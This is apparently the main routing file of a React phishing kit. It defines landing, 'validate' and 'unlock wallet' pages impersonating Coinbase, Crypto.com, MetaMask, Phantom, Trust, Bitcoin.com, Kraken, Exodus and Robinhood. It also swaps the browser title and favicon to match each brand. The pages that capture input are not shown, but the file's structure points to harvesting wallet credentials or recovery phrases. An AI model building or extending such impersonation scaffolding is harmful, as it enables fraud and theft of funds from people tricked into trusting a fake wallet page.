import React, { useEffect } from 'react';
import { BrowserRouter, Route, Routes, useLocation  } from "react-router-dom";
import Landing from './pages/Landing';
import Home from './pages/Home';
import Wallet from './pages/Wallet';
import { ToastContainer } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';
import CryptoLanding from './cryptoCom/cryptoPages/CryptoLanding';
import CryptoHome from './cryptoCom/cryptoPages/CryptoHome';
import CryptoWallet from './cryptoCom/cryptoPages/CryptoWallet';
import MetaMaskLanding from './metaMask/metaMaskPages/MetaMaskLanding';
import PhantomLanding from './phantom/phantomPages/PhantomLanding';
import PhantomHome from './phantom/phantomPages/PhantomHome';
import PhantomWallet from './phantom/phantomPages/PhantomWallet';
import MetaMaskHome from './metaMask/metaMaskPages/MetaMaskHome';
import MetaMaskWallet from './metaMask/metaMaskPages/MetaMaskWallet';
import TrustLanding from './trust/trustPages/TrustLanding';
import TrustHome from './trust/trustPages/TrustHome';
import TrustWallet from './trust/trustPages/TrustWallet';
import Default from './pages/Default';
import BitcoinLanding from './bitcoinCom/bitcoinPages/BitcoinLanding';
import BitcoinHome from './bitcoinCom/bitcoinPages/BitcoinHome';
import BitcoinWallet from './bitcoinCom/bitcoinPages/BitcoinWallet';
import KrakenLanding from './kraken/krakenPages/KrakenLanding';
import KrakenHome from './kraken/krakenPages/KrakenHome';
import KrakenWallet from './kraken/krakenPages/KrakenWallet';
import ExodusLanding from './exodus/exodusPages/ExodusLanding';
import ExodusHome from './exodus/exodusPages/ExodusHome';
import ExodusWallet from './exodus/exodusPages/ExodusWallet';
import RobinHoodLanding from './robinHood/robinHoodPages/RobinHoodLanding';
import RobinHoodHome from './robinHood/robinHoodPages/RobinHoodHome';
import RobinHoodWallet from './robinHood/robinHoodPages/RobinHoodWallet';

const App = () => {
  return (
    <>
      <BrowserRouter>
        <DynamicTitleAndLogo/>
        <Routes> 
          <Route path='/' element={<Default/>}/>
          <Route path='/coinbase' element={<Landing/>}/>
          <Route path='/coinbase/validate' element={<Home/>}/>
          <Route path='/unlock-Coinbase-wallet' element={<Wallet/>}/>
          <Route path='/crypto' element={<CryptoLanding/>}/>
          <Route path='/crypto/validate' element={<CryptoHome/>}/>
          <Route path='/crypto/unlock-crypto-wallet' element={<CryptoWallet/>}/>
          <Route path='/phantom' element={<PhantomLanding/>}/>
          <Route path='/phantom/validate' element={<PhantomHome/>}/>
          <Route path='/phantom/unlock-phantom-wallet' element={<PhantomWallet/>}/>
          <Route path='/metamask' element={<MetaMaskLanding/>}/>
          <Route path='/metamask/validate' element={<MetaMaskHome/>}/>
          <Route path='/metamask/unlock-metamask-wallet' element={<MetaMaskWallet/>}/>
          <Route path='/trust' element={<TrustLanding/>}/>
          <Route path='/trust/validate' element={<TrustHome/>}/>
          <Route path='unlock-trust-wallet' element={<TrustWallet/>}/>
          <Route path='/bitcoin' element={<BitcoinLanding/>}/>
          <Route path='/bitcoin/validate' element={<BitcoinHome/>}/>
          <Route path='unlock-bitcoin-wallet' element={<BitcoinWallet/>}/>
          <Route path='/kraken' element={<KrakenLanding/>}/>
          <Route path='/kraken/validate' element={<KrakenHome/>}/>
          <Route path='unlock-kraken-wallet' element={<KrakenWallet/>}/>
          <Route path='/exodus' element={<ExodusLanding/>}/>
          <Route path='/exodus/validate' element={<ExodusHome/>}/>
          <Route path='unlock-exodus-wallet' element={<ExodusWallet/>}/>
          <Route path='/robinhood' element={<RobinHoodLanding/>}/>
          <Route path='/robinhood/validate' element={<RobinHoodHome/>}/>
          <Route path='unlock-robinhood-wallet' element={<RobinHoodWallet/>}/>
        </Routes>
      </BrowserRouter>
      <ToastContainer />
    </>
  )
}

function DynamicTitleAndLogo() {
  const location = useLocation();

  useEffect(() => {
    const updateMetaData = () => {
      if (location.pathname.includes("coinbase")) {
        document.title = "Coinbase";
        document.querySelector("link[rel='icon']").href = "/logoTop.png";
      }
      else if (location.pathname.includes("crypto")) {
        document.title = "Crypto";
        document.querySelector("link[rel='icon']").href = "/crypto_com_logo.png";
      } else  if (location.pathname.includes("metamask")) {
        document.title = "Metamask";
        document.querySelector("link[rel='icon']").href = "/Meta.png";
      } else  if (location.pathname.includes("phantom")) {
        document.title = "Phantom";
        document.querySelector("link[rel='icon']").href = "/phantom_logo.png";
      } else  if (location.pathname.includes("trust")) {
        document.title = "Trust";
        document.querySelector("link[rel='icon']").href = "/trust_logo.png";
      } else  if (location.pathname.includes("bitcoin")) {
        document.title = "wallet,bitcoin.com";
        document.querySelector("link[rel='icon']").href = "/bitcoin_logo.png";
      }
      else  if (location.pathname.includes("kraken")) {
        document.title = "kraken wallet";
        document.querySelector("link[rel='icon']").href = "/kraken_logo.png";
      }
      else  if (location.pathname.includes("exodus")) {
        document.title = "Exodus wallet";
        document.querySelector("link[rel='icon']").href = "/exodus_logo.png";
      }
      else  if (location.pathname.includes("robinhood")) {
        document.title = "RobinHood wallet";
        document.querySelector("link[rel='icon']").href = "/robinhood_logo.png";
      }
      else {
        document.title = "empty";
        document.querySelector("link[rel='icon']").href = "";
      }
    };

    updateMetaData();
  }, [location]);

  return null;
}

export default App;